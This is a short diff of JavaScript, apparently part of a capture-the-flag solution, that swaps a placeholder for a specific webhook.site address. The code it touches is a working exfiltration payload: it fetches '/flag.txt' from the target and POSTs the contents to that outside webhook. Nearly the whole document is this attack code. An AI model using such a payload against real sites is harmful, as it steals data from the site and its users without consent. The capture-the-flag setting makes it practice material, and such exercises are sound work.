@@ -4,7 +4,7 @@
     fetch('/flag.txt')
       .then(response => response.text())
       .then(data => {
-        fetch('https://webhook.site/your-webhook-url', {
+        fetch('https://webhook.site/582e502c-88ba-4c5a-9eda-2c2e1a3b289b', {
           method: 'POST',
           body: data
         });
